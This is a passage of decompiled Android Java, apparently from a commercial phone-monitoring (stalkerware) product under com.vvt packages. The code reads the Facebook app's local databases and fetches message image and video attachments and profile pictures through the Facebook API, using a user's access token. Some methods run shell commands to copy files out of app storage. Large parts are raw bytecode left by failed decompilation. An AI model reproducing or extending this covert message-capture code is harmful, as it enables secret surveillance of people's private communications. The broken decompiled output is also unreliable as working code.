            localObject4 = localObject1;
          }
          catch (Exception localException3)
          {
            continue;
          }
          if (str2 != null)
          {
            localObject5 = str2.toLowerCase();
            str3 = "image";
            i3 = ((String)localObject5).contains(str3);
            if (i3 != 0)
            {
              i3 = 1;
              if (paramString5 != null)
              {
                i6 = paramString5.length();
                i8 = 5;
                if ((i6 > i8) && (localObject6 != null))
                {
                  i6 = ((String)localObject6).length();
                  i8 = 3;
                  if (i6 > i8)
                  {
                    bool12 = a;
                    if (bool12) {}
                    bool12 = false;
                    str3 = null;
                    localObject4 = a(paramString2, false);
                    str3 = "https://api.facebook.com/method/messaging.getAttachment?mid=%s&aid=%s&access_token=%s&format=binary";
                    i8 = 3;
                    localObject7 = new Object[i8];
                    i9 = 0;
                    localObject7[0] = paramString1;
                    i9 = 1;
                    localObject7[i9] = localObject6;
                    i7 = 2;
                    localObject7[i7] = paramString5;
                    localObject6 = String.format(str3, (Object[])localObject7);
                    bool12 = a;
                    if (bool12) {}
                    bool14 = c((String)localObject6, (String)localObject4);
                    if (!bool14)
                    {
                      bool6 = a;
                      if (bool6) {}
                      bool6 = false;
                      localObject4 = null;
                    }
                    if (localObject4 != null)
                    {
                      localObject6 = new java/io/File;
                      ((File)localObject6).<init>((String)localObject4);
                      bool12 = ((File)localObject6).exists();
                      if (bool12)
                      {
                        l = ((File)localObject6).length();
                        i3 = 1;
                        bool9 = a(i3, paramb, l);
                        bool12 = a;
                        if ((!bool12) || (!bool9))
                        {
                          ((File)localObject6).delete();
                          bool6 = false;
                          localObject4 = null;
                        }
                      }
                    }
                  }
                }
              }
              if (bool9)
              {
                bool9 = a;
                if (bool9) {}
                bool9 = true;
                localObject3 = a(paramString2, bool9);
                localObject5 = "urls";
                bool9 = ((JSONObject)localObject1).has((String)localObject5);
                if (bool9)
                {
                  bool9 = a;
                  if (bool9) {}
                  localObject5 = "urls";
                  localObject1 = ((JSONObject)localObject1).getString((String)localObject5);
                  localObject5 = new org/json/JSONObject;
                  ((JSONObject)localObject5).<init>((String)localObject1);
                  localObject1 = "MEDIUM_PREVIEW";
                  bool5 = ((JSONObject)localObject5).has((String)localObject1);
                  if (bool5)
                  {
                    localObject1 = "MEDIUM_PREVIEW";
                    localObject1 = ((JSONObject)localObject5).getString((String)localObject1);
                    localObject5 = new org/json/JSONObject;
                    ((JSONObject)localObject5).<init>((String)localObject1);
                    localObject1 = "src";
                    localObject1 = ((JSONObject)localObject5).getString((String)localObject1);
                    bool9 = a;
                    if (bool9) {}
                    bool5 = c((String)localObject1, (String)localObject3);
                    if (!bool5)
                    {
                      bool5 = a;
                      if (bool5) {}
                      bool5 = false;
                      localObject1 = null;
                      bool6 = false;
                      localObject4 = null;
                    }
                  }
                  else
                  {
                    bool5 = c;
                    if (!bool5) {}
                  }
                  localObject1 = localObject4;
                  localObject4 = localObject3;
                  continue;
                }
                bool5 = c;
                if (bool5) {}
                localObject1 = new java/lang/StringBuilder;
                ((StringBuilder)localObject1).<init>();
                localObject5 = "https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-prn1/p200x200/";
                localObject1 = ((StringBuilder)localObject1).append((String)localObject5);
                localObject1 = ((StringBuilder)localObject1).append(str1);
                localObject1 = ((StringBuilder)localObject1).toString();
                bool5 = c((String)localObject1, (String)localObject3);
                if (bool5) {
                  continue;
                }
                bool5 = a;
                if (bool5) {}
                localObject1 = localObject4;
                continue;
              }
              i1 = 0;
              localObject3 = null;
              bool5 = false;
              localObject1 = null;
              bool6 = false;
              localObject4 = null;
              continue;
            }
          }
          if (str2 != null)
          {
            localObject5 = str2.toLowerCase();
            localObject6 = "video";
            bool9 = ((String)localObject5).contains((CharSequence)localObject6);
            if (bool9)
            {
              bool9 = true;
              localObject6 = "video_data_url";
              bool14 = ((JSONObject)localObject1).has((String)localObject6);
              if (bool14)
              {
                bool14 = false;
                localObject6 = null;
                localObject4 = a(paramString2, false);
                localObject6 = "video_data_url";
                localObject6 = ((JSONObject)localObject1).getString((String)localObject6);
                bool12 = a;
                if (bool12) {}
                bool14 = c((String)localObject6, (String)localObject4);
                if (!bool14)
                {
                  bool6 = a;
                  if (bool6) {}
                  bool6 = false;
                  localObject4 = null;
                }
                if (localObject4 != null)
                {
                  localObject6 = new java/io/File;
                  ((File)localObject6).<init>((String)localObject4);
                  bool12 = ((File)localObject6).exists();
                  if (bool12)
                  {
                    l = ((File)localObject6).length();
                    i4 = 3;
                    bool10 = a(i4, paramb, l);
                    bool12 = a;
                    if ((!bool12) || (!bool10))
                    {
                      ((File)localObject6).delete();
                      bool6 = false;
                      localObject4 = null;
                    }
                  }
                }
              }
              if (bool10)
              {
                localObject5 = "video_data_thumbnail_url";
                bool10 = ((JSONObject)localObject1).has((String)localObject5);
                if (bool10)
                {
                  bool10 = true;
                  localObject3 = a(paramString2, bool10);
                  localObject5 = "video_data_thumbnail_url";
                  localObject1 = ((JSONObject)localObject1).getString((String)localObject5);
                  bool10 = a;
                  if (bool10) {}
                  bool5 = c((String)localObject1, (String)localObject3);
                  if (!bool5)
                  {
                    bool5 = a;
                    if (bool5) {}
                    localObject1 = localObject4;
                  }
                }
              }
              else
              {
                i1 = 0;
                localObject3 = null;
                bool5 = false;
                localObject1 = null;
                bool6 = false;
                localObject4 = null;
                continue;
                bool8 = c;
                if (!bool8) {}
              }
            }
          }
        }
      }
    }
    boolean bool5 = a;
    if (bool5) {}
    return localArrayList;
  }
  
  private static boolean a(int paramInt, com.vvt.base.b paramb, long paramLong)
  {
    int i = 1;
    float f = Float.MIN_VALUE;
    boolean bool4 = false;
    long l1 = 0L;
    boolean bool5 = paramLong < l1;
    if (!bool5) {}
    label93:
    boolean bool3;
    for (bool5 = false;; bool5 = bool3)
    {
      long l2;
      if (paramInt == i)
      {
        l2 = paramb.b();
        boolean bool1 = paramLong < l2;
        if (!bool1) {
          break label93;
        }
      }
      for (;;)
      {
        bool5 = a;
        if (bool5) {}
        return bool4;
        int j = 2;
        f = 2.8E-45F;
        if (paramInt == j)
        {
          l2 = paramb.d();
          boolean bool2 = paramLong < l2;
          if (bool2) {}
        }
        else
        {
          label133:
          do
          {
            do
            {
              bool4 = bool5;
              break;
              int k = 3;
              f = 4.2E-45F;
              if (paramInt != k) {
                break label133;
              }
              l2 = paramb.c();
              bool3 = paramLong < l2;
            } while (!bool3);
            break;
            l2 = paramb.e();
            bool3 = paramLong < l2;
          } while (!bool3);
        }
      }
    }
  }
  
  /* Error */
  private static boolean a(SQLiteDatabase paramSQLiteDatabase)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: ldc_w 383
    //   7: astore_3
    //   8: iconst_0
    //   9: istore 4
    //   11: ldc_w 370
    //   14: astore 5
    //   16: aload_0
    //   17: astore 6
    //   19: aload_0
    //   20: aload_3
    //   21: aconst_null
    //   22: aconst_null
    //   23: aconst_null
    //   24: aconst_null
    //   25: aconst_null
    //   26: aconst_null
    //   27: aload 5
    //   29: invokevirtual 373	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   32: astore_3
    //   33: aload_3
    //   34: ifnull +37 -> 71
    //   37: ldc_w 592
    //   40: astore 6
    //   42: aload_3
    //   43: aload 6
    //   45: invokeinterface 82 2 0
    //   50: istore 7
    //   52: iconst_m1
    //   53: istore 4
    //   55: iload 7
    //   57: iload 4
    //   59: if_icmpne +34 -> 93
    //   62: iconst_0
    //   63: istore 7
    //   65: aconst_null
    //   66: astore 6
    //   68: iload 7
    //   70: istore_1
    //   71: aload_3
    //   72: ifnull +9 -> 81
    //   75: aload_3
    //   76: invokeinterface 112 1 0
    //   81: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   84: istore 7
    //   86: iload 7
    //   88: ifeq +3 -> 91
    //   91: iload_1
    //   92: ireturn
    //   93: iconst_1
    //   94: istore 7
    //   96: goto -28 -> 68
    //   99: astore 6
    //   101: iconst_0
    //   102: istore 7
    //   104: aconst_null
    //   105: astore 6
    //   107: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   110: istore 8
    //   112: iload 8
    //   114: ifeq +3 -> 117
    //   117: aload 6
    //   119: ifnull -38 -> 81
    //   122: aload 6
    //   124: invokeinterface 112 1 0
    //   129: goto -48 -> 81
    //   132: astore 6
    //   134: aload_2
    //   135: ifnull +9 -> 144
    //   138: aload_2
    //   139: invokeinterface 112 1 0
    //   144: aload 6
    //   146: athrow
    //   147: astore 6
    //   149: aload_3
    //   150: astore_2
    //   151: goto -17 -> 134
    //   154: astore_3
    //   155: aload 6
    //   157: astore_2
    //   158: aload_3
    //   159: astore 6
    //   161: goto -27 -> 134
    //   164: astore 6
    //   166: aload_3
    //   167: astore 6
    //   169: goto -62 -> 107
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	172	0	paramSQLiteDatabase	SQLiteDatabase
    //   1	91	1	bool1	boolean
    //   3	155	2	localObject1	Object
    //   7	143	3	localObject2	Object
    //   154	13	3	localObject3	Object
    //   9	51	4	i	int
    //   14	14	5	str	String
    //   17	50	6	localObject4	Object
    //   99	1	6	localException1	Exception
    //   105	18	6	localObject5	Object
    //   132	13	6	localObject6	Object
    //   147	9	6	localObject7	Object
    //   159	1	6	localObject8	Object
    //   164	1	6	localException2	Exception
    //   167	1	6	localObject9	Object
    //   50	19	7	j	int
    //   84	19	7	bool2	boolean
    //   110	3	8	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   27	32	99	java/lang/Exception
    //   27	32	132	finally
    //   43	50	147	finally
    //   107	110	154	finally
    //   43	50	164	java/lang/Exception
  }
  
  private static boolean a(SQLiteDatabase paramSQLiteDatabase, com.vvt.capture.b.d paramd)
  {
    boolean bool1 = true;
    boolean bool2 = paramd.m();
    if (bool2) {}
    for (;;)
    {
      return bool1;
      List localList = paramd.f();
      int i = localList.size();
      if (i <= 0) {
        bool1 = false;
      }
    }
  }
  
  private static boolean a(byte[] paramArrayOfByte)
  {
    int i = 70;
    boolean bool = true;
    if (paramArrayOfByte != null)
    {
      int j = paramArrayOfByte.length;
      int k = 12;
      if (j > k)
      {
        j = paramArrayOfByte[0];
        k = 82;
        if (j == k)
        {
          j = paramArrayOfByte[bool];
          k = 73;
          if (j == k)
          {
            j = paramArrayOfByte[2];
            if (j == i)
            {
              j = paramArrayOfByte[3];
              if (j == i)
              {
                j = paramArrayOfByte[8];
                k = 87;
                if (j == k)
                {
                  j = paramArrayOfByte[9];
                  k = 69;
                  if (j == k)
                  {
                    j = paramArrayOfByte[10];
                    k = 66;
                    if (j == k)
                    {
                      j = paramArrayOfByte[11];
                      k = 80;
                      if (j != k) {}
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    for (;;)
    {
      return bool;
      bool = false;
    }
  }
  
  /* Error */
  private static byte[] a(SQLiteDatabase paramSQLiteDatabase1, String paramString1, String paramString2, String paramString3, SQLiteDatabase paramSQLiteDatabase2)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore 5
    //   3: aconst_null
    //   4: astore 6
    //   6: aconst_null
    //   7: astore 7
    //   9: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   12: istore 8
    //   14: iload 8
    //   16: ifeq +3 -> 19
    //   19: iconst_0
    //   20: newarray <illegal type>
    //   22: astore 9
    //   24: iconst_0
    //   25: newarray <illegal type>
    //   27: astore 10
    //   29: aload_1
    //   30: ifnull +229 -> 259
    //   33: ldc_w 1180
    //   36: astore 10
    //   38: iconst_1
    //   39: istore 5
    //   41: iload 5
    //   43: anewarray 4	java/lang/Object
    //   46: astore 6
    //   48: iconst_0
    //   49: istore 11
    //   51: aconst_null
    //   52: astore 12
    //   54: ldc_w 274
    //   57: astore 13
    //   59: aload 6
    //   61: iconst_0
    //   62: aload 13
    //   64: aastore
    //   65: aload 10
    //   67: aload 6
    //   69: invokestatic 453	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   72: astore 13
    //   74: iconst_1
    //   75: istore 8
    //   77: iload 8
    //   79: anewarray 26	java/lang/String
    //   82: astore 14
    //   84: iconst_0
    //   85: istore 8
    //   87: aconst_null
    //   88: astore 10
    //   90: aload 14
    //   92: iconst_0
    //   93: aload_1
    //   94: aastore
    //   95: aload_0
    //   96: ifnull +433 -> 529
    //   99: ldc_w 1182
    //   102: astore 6
    //   104: iconst_0
    //   105: istore 11
    //   107: aconst_null
    //   108: astore 12
    //   110: aload_0
    //   111: astore 10
    //   113: aload_0
    //   114: aload 6
    //   116: aconst_null
    //   117: aload 13
    //   119: aload 14
    //   121: aconst_null
    //   122: aconst_null
    //   123: aconst_null
    //   124: invokevirtual 195	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   127: astore 10
    //   129: aload 10
    //   131: ifnull +391 -> 522
    //   134: aload 10
    //   136: invokeinterface 139 1 0
    //   141: istore 5
    //   143: iload 5
    //   145: ifeq +377 -> 522
    //   148: ldc_w 1184
    //   151: astore 6
    //   153: aload 10
    //   155: aload 6
    //   157: invokeinterface 82 2 0
    //   162: istore 5
    //   164: iload 5
    //   166: ifle +121 -> 287
    //   169: aload 10
    //   171: iload 5
    //   173: invokeinterface 85 2 0
    //   178: astore 7
    //   180: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   183: istore 5
    //   185: iload 5
    //   187: ifeq +3 -> 190
    //   190: aload 7
    //   192: ifnull +330 -> 522
    //   195: aload 7
    //   197: invokestatic 229	com/vvt/capture/removeFromPath/a/a:FxFileObserverWorker	(Ljava/lang/String;)[B
    //   200: astore 6
    //   202: aload 6
    //   204: invokestatic 1187	com/vvt/capture/removeFromPath/a/a:a	([B)Z
    //   207: istore 11
    //   209: iload 11
    //   211: ifeq +232 -> 443
    //   214: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   217: istore 11
    //   219: iload 11
    //   221: ifeq +3 -> 224
    //   224: invokestatic 1191	com/vvt/aa/a:a	()Z
    //   227: istore 11
    //   229: iload 11
    //   231: ifeq +192 -> 423
    //   234: aload 6
    //   236: aload_2
    //   237: aload_3
    //   238: invokestatic 1194	com/vvt/capture/removeFromPath/a/a:a	([BLjava/lang/String;Ljava/lang/String;)[B
    //   241: astore 6
    //   243: aload 10
    //   245: ifnull +10 -> 255
    //   248: aload 10
    //   250: invokeinterface 112 1 0
    //   255: aload 6
    //   257: astore 9
    //   259: aload 9
    //   261: ifnull +13 -> 274
    //   264: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   267: istore 8
    //   269: iload 8
    //   271: ifeq +3 -> 274
    //   274: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   277: istore 8
    //   279: iload 8
    //   281: ifeq +3 -> 284
    //   284: aload 9
    //   286: areturn
    //   287: ldc_w 1196
    //   290: astore 6
    //   292: aload 10
    //   294: aload 6
    //   296: invokeinterface 82 2 0
    //   301: istore 5
    //   303: iload 5
    //   305: ifle -125 -> 180
    //   308: aload 10
    //   310: iload 5
    //   312: invokeinterface 85 2 0
    //   317: astore 6
    //   319: aload 6
    //   321: invokestatic 119	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   324: istore 11
    //   326: iload 11
    //   328: ifeq +52 -> 380
    //   331: ldc_w 278
    //   334: astore 6
    //   336: aload_1
    //   337: aload 6
    //   339: invokevirtual 281	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   342: istore 5
    //   344: iconst_m1
    //   345: istore 11
    //   347: iload 5
    //   349: iload 11
    //   351: if_icmpeq +17 -> 368
    //   354: iload 5
    //   356: iconst_1
    //   357: iadd
    //   358: istore 5
    //   360: aload_1
    //   361: iload 5
    //   363: invokevirtual 284	java/lang/String:substring	(I)Ljava/lang/String;
    //   366: astore 7
    //   368: aload 4
    //   370: aload 7
    //   372: invokestatic 1198	com/vvt/capture/removeFromPath/a/a:e	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Ljava/lang/String;
    //   375: astore 7
    //   377: goto -197 -> 180
    //   380: new 801	org/json/JSONArray
    //   383: astore 12
    //   385: aload 12
    //   387: aload 6
    //   389: invokespecial 802	org/json/JSONArray:<init>	(Ljava/lang/String;)V
    //   392: iconst_0
    //   393: istore 5
    //   395: aconst_null
    //   396: astore 6
    //   398: aload 12
    //   400: iconst_0
    //   401: invokevirtual 830	org/json/JSONArray:getJSONObject	(I)Lorg/json/JSONObject;
    //   404: astore 6
    //   406: ldc_w 1200
    //   409: astore 12
    //   411: aload 6
    //   413: aload 12
    //   415: invokevirtual 211	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   418: astore 7
    //   420: goto -240 -> 180
    //   423: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   426: istore 11
    //   428: iload 11
    //   430: ifeq +3 -> 433
    //   433: aload 6
    //   435: invokestatic 1205	com/vvt/io/s:a	([B)[B
    //   438: astore 6
    //   440: goto -197 -> 243
    //   443: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   446: istore 11
    //   448: iload 11
    //   450: ifeq -207 -> 243
    //   453: goto -210 -> 243
    //   456: astore 10
    //   458: iconst_0
    //   459: istore 8
    //   461: aconst_null
    //   462: astore 10
    //   464: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   467: istore 5
    //   469: iload 5
    //   471: ifeq +3 -> 474
    //   474: aload 10
    //   476: ifnull -217 -> 259
    //   479: aload 10
    //   481: invokeinterface 112 1 0
    //   486: goto -227 -> 259
    //   489: aload 7
    //   491: ifnull +10 -> 501
    //   494: aload 7
    //   496: invokeinterface 112 1 0
    //   501: aload 10
    //   503: athrow
    //   504: astore 6
    //   506: aload 10
    //   508: astore 7
    //   510: aload 6
    //   512: astore 10
    //   514: goto -25 -> 489
    //   517: astore 6
    //   519: goto -55 -> 464
    //   522: aload 9
    //   524: astore 6
    //   526: goto -283 -> 243
    //   529: iconst_0
    //   530: istore 8
    //   532: aconst_null
    //   533: astore 10
    //   535: aload 9
    //   537: astore 6
    //   539: goto -296 -> 243
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	542	0	paramSQLiteDatabase1	SQLiteDatabase
    //   0	542	1	paramString1	String
    //   0	542	2	paramString2	String
    //   0	542	3	paramString3	String
    //   0	542	4	paramSQLiteDatabase2	SQLiteDatabase
    //   1	143	5	bool1	boolean
    //   162	10	5	i	int
    //   183	3	5	bool2	boolean
    //   301	93	5	j	int
    //   467	3	5	bool3	boolean
    //   4	435	6	localObject1	Object
    //   504	7	6	localObject2	Object
    //   517	1	6	localObject3	Object
    //   524	14	6	localObject4	Object
    //   7	502	7	localObject5	Object
    //   12	519	8	bool4	boolean
    //   22	514	9	localObject6	Object
    //   27	282	10	localObject7	Object
    //   456	1	10	localObject8	Object
    //   462	72	10	localObject9	Object
    //   49	278	11	bool5	boolean
    //   345	7	11	k	int
    //   426	23	11	bool6	boolean
    //   52	362	12	localObject10	Object
    //   57	61	13	str	String
    //   82	38	14	arrayOfString	String[]
    // Exception table:
    //   from	to	target	type
    //   41	46	456	finally
    //   62	65	456	finally
    //   67	72	456	finally
    //   77	82	456	finally
    //   93	95	456	finally
    //   123	127	456	finally
    //   464	467	504	finally
    //   134	141	517	finally
    //   155	162	517	finally
    //   171	178	517	finally
    //   180	183	517	finally
    //   195	200	517	finally
    //   202	207	517	finally
    //   214	217	517	finally
    //   224	227	517	finally
    //   237	241	517	finally
    //   294	301	517	finally
    //   310	317	517	finally
    //   319	324	517	finally
    //   337	342	517	finally
    //   361	366	517	finally
    //   370	375	517	finally
    //   380	383	517	finally
    //   387	392	517	finally
    //   400	404	517	finally
    //   413	418	517	finally
    //   423	426	517	finally
    //   433	438	517	finally
    //   443	446	517	finally
  }
  
  /* Error */
  private static byte[] a(byte[] paramArrayOfByte, String paramString1, String paramString2)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   5: istore 4
    //   7: iload 4
    //   9: ifeq +3 -> 12
    //   12: aload_1
    //   13: ldc_w 1207
    //   16: invokestatic 504	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   19: astore 5
    //   21: getstatic 235	com/vvt/im/events/ImType:FACEBOOK	Lcom/vvt/im/events/ImType;
    //   24: astore 6
    //   26: getstatic 837	com/vvt/im/events/ImMediaFileType:USER_PROFILE	Lcom/vvt/im/events/ImMediaFileType;
    //   29: astore 7
    //   31: aload_1
    //   32: aload 6
    //   34: aload 7
    //   36: invokestatic 246	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Lcom/vvt/im/events/ImType;Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   39: astore 6
    //   41: getstatic 837	com/vvt/im/events/ImMediaFileType:USER_PROFILE	Lcom/vvt/im/events/ImMediaFileType;
    //   44: invokestatic 249	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   47: astore 7
    //   49: aload 6
    //   51: aload 7
    //   53: invokestatic 504	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   56: astore 8
    //   58: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   61: istore 9
    //   63: iload 9
    //   65: ifeq +3 -> 68
    //   68: aload_0
    //   69: aload 6
    //   71: aload 7
    //   73: invokestatic 254	com/vvt/io/d:a	([BLjava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   76: pop
    //   77: aload 6
    //   79: ldc_w 1209
    //   82: invokestatic 504	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   85: astore 7
    //   87: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   90: istore 4
    //   92: iload 4
    //   94: ifeq +3 -> 97
    //   97: aload 8
    //   99: invokestatic 1211	com/vvt/io/d:f	(Ljava/lang/String;)Z
    //   102: istore 4
    //   104: iload 4
    //   106: ifeq +271 -> 377
    //   109: invokestatic 1216	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   112: astore 6
    //   114: ldc_w 1218
    //   117: astore 10
    //   119: iconst_5
    //   120: istore 11
    //   122: iload 11
    //   124: anewarray 4	java/lang/Object
    //   127: astore 12
    //   129: iconst_0
    //   130: istore 13
    //   132: aload 12
    //   134: iconst_0
    //   135: aload 5
    //   137: aastore
    //   138: iconst_1
    //   139: istore 13
    //   141: aload 12
    //   143: iload 13
    //   145: aload_2
    //   146: aastore
    //   147: iconst_2
    //   148: istore 13
    //   150: aload 12
    //   152: iload 13
    //   154: aload_2
    //   155: aastore
    //   156: iconst_3
    //   157: istore 13
    //   159: aload 12
    //   161: iload 13
    //   163: aload 5
    //   165: aastore
    //   166: iconst_4
    //   167: istore 13
    //   169: aload 12
    //   171: iload 13
    //   173: aload 7
    //   175: aastore
    //   176: aload 10
    //   178: aload 12
    //   180: invokestatic 453	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   183: astore 10
    //   185: aload 6
    //   187: aload 10
    //   189: invokevirtual 1219	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   192: pop
    //   193: ldc_w 1221
    //   196: astore 10
    //   198: iconst_3
    //   199: istore 11
    //   201: iload 11
    //   203: anewarray 4	java/lang/Object
    //   206: astore 12
    //   208: iconst_0
    //   209: istore 13
    //   211: aload 12
    //   213: iconst_0
    //   214: aload 5
    //   216: aastore
    //   217: iconst_1
    //   218: istore 14
    //   220: aload 12
    //   222: iload 14
    //   224: aload 8
    //   226: aastore
    //   227: iconst_2
    //   228: istore 14
    //   230: aload 12
    //   232: iload 14
    //   234: aload 7
    //   236: aastore
    //   237: aload 10
    //   239: aload 12
    //   241: invokestatic 453	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   244: astore 5
    //   246: aload 6
    //   248: aload 5
    //   250: invokevirtual 1219	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   253: pop
    //   254: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   257: istore 14
    //   259: iload 14
    //   261: ifeq +3 -> 264
    //   264: aload 7
    //   266: invokestatic 1211	com/vvt/io/d:f	(Ljava/lang/String;)Z
    //   269: istore 14
    //   271: iload 14
    //   273: ifeq +19 -> 292
    //   276: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   279: istore 14
    //   281: iload 14
    //   283: ifeq +3 -> 286
    //   286: aload 7
    //   288: invokestatic 1223	com/vvt/io/d:MyUncaughtExceptionHandler	(Ljava/lang/String;)[B
    //   291: astore_3
    //   292: aload 6
    //   294: ifnull +8 -> 302
    //   297: aload 6
    //   299: invokevirtual 1225	com/vvt/shell/f:d	()V
    //   302: aload_3
    //   303: ifnull +87 -> 390
    //   306: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   309: istore 4
    //   311: iload 4
    //   313: ifeq +3 -> 316
    //   316: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   319: istore 4
    //   321: iload 4
    //   323: ifeq +3 -> 326
    //   326: aload_3
    //   327: areturn
    //   328: astore 6
    //   330: iconst_0
    //   331: istore 4
    //   333: aconst_null
    //   334: astore 6
    //   336: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   339: istore 14
    //   341: iload 14
    //   343: ifeq +3 -> 346
    //   346: aload 6
    //   348: ifnull -46 -> 302
    //   351: goto -54 -> 297
    //   354: astore 15
    //   356: iconst_0
    //   357: istore 4
    //   359: aconst_null
    //   360: astore 6
    //   362: aload 15
    //   364: astore_3
    //   365: aload 6
    //   367: ifnull +8 -> 375
    //   370: aload 6
    //   372: invokevirtual 1225	com/vvt/shell/f:d	()V
    //   375: aload_3
    //   376: athrow
    //   377: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   380: istore 4
    //   382: iload 4
    //   384: ifeq -82 -> 302
    //   387: goto -85 -> 302
    //   390: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   393: istore 4
    //   395: iload 4
    //   397: ifeq -81 -> 316
    //   400: goto -84 -> 316
    //   403: astore_3
    //   404: goto -39 -> 365
    //   407: astore 5
    //   409: goto -73 -> 336
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	412	0	paramArrayOfByte	byte[]
    //   0	412	1	paramString1	String
    //   0	412	2	paramString2	String
    //   1	375	3	localObject1	Object
    //   403	1	3	localObject2	Object
    //   5	391	4	bool1	boolean
    //   19	230	5	str1	String
    //   407	1	5	localException1	Exception
    //   24	274	6	localObject3	Object
    //   328	1	6	localException2	Exception
    //   334	37	6	localObject4	Object
    //   29	258	7	localObject5	Object
    //   56	169	8	str2	String
    //   61	3	9	bool2	boolean
    //   117	121	10	str3	String
    //   120	82	11	i	int
    //   127	113	12	arrayOfObject	Object[]
    //   130	80	13	j	int
    //   218	15	14	k	int
    //   257	85	14	bool3	boolean
    //   354	9	15	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   109	112	328	java/lang/Exception
    //   109	112	354	finally
    //   122	127	403	finally
    //   135	138	403	finally
    //   145	147	403	finally
    //   154	156	403	finally
    //   163	166	403	finally
    //   173	176	403	finally
    //   178	183	403	finally
    //   187	193	403	finally
    //   201	206	403	finally
    //   214	217	403	finally
    //   224	227	403	finally
    //   234	237	403	finally
    //   239	244	403	finally
    //   248	254	403	finally
    //   254	257	403	finally
    //   264	269	403	finally
    //   276	279	403	finally
    //   286	291	403	finally
    //   336	339	403	finally
    //   122	127	407	java/lang/Exception
    //   135	138	407	java/lang/Exception
    //   145	147	407	java/lang/Exception
    //   154	156	407	java/lang/Exception
    //   163	166	407	java/lang/Exception
    //   173	176	407	java/lang/Exception
    //   178	183	407	java/lang/Exception
    //   187	193	407	java/lang/Exception
    //   201	206	407	java/lang/Exception
    //   214	217	407	java/lang/Exception
    //   224	227	407	java/lang/Exception
    //   234	237	407	java/lang/Exception
    //   239	244	407	java/lang/Exception
    //   248	254	407	java/lang/Exception
    //   254	257	407	java/lang/Exception
    //   264	269	407	java/lang/Exception
    //   276	279	407	java/lang/Exception
    //   286	291	407	java/lang/Exception
  }
  
  /* Error */
  public static com.vvt.capture.b.d b()
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_0
    //   2: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   5: istore_1
    //   6: iload_1
    //   7: ifeq +3 -> 10
    //   10: ldc 127
    //   12: astore_2
    //   13: aload_2
    //   14: invokestatic 761	com/vvt/capture/removeFromPath/a/a:a	(Ljava/lang/String;)Ljava/lang/String;
    //   17: astore_2
    //   18: aload_2
    //   19: ifnull +777 -> 796
    //   22: ldc 127
    //   24: astore_2
    //   25: ldc_w 440
    //   28: astore_3
    //   29: aload_2
    //   30: aload_3
    //   31: invokestatic 1032	com/vvt/p/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   34: astore_3
    //   35: aload_3
    //   36: ifnull +747 -> 783
